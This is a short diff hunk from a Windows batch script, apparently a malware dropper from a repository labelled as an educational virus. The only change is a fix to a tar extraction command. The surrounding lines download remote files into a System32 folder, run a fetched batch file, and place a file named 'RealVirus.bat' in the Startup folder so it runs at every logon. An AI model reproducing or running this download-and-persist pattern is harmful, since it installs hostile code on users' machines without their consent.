@@ -101,7 +101,7 @@ powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/Da
 start C:\Windows\System32\fuckoffwindows\python_dowloads.bat
 ::Dowload nircmd
 powershell (new-object System.Net.WebClient).DownloadFile('https://www.nirsoft.net/utils/nircmd-x64.zip','C:\Windows\System32\fuckoffwindows\nircmd-x64.zip')
-tar nircmd-x64.zip
+tar -xf nircmd-x64.zip
 ::TAKEOWN
 powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/DarioStar999/Virus-educational-purpose-only/releases/download/REALEASES/RealVirus.bat','C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RealVirus.bat')
 @echo attendi mentre estraiamo il contenuto della cartella
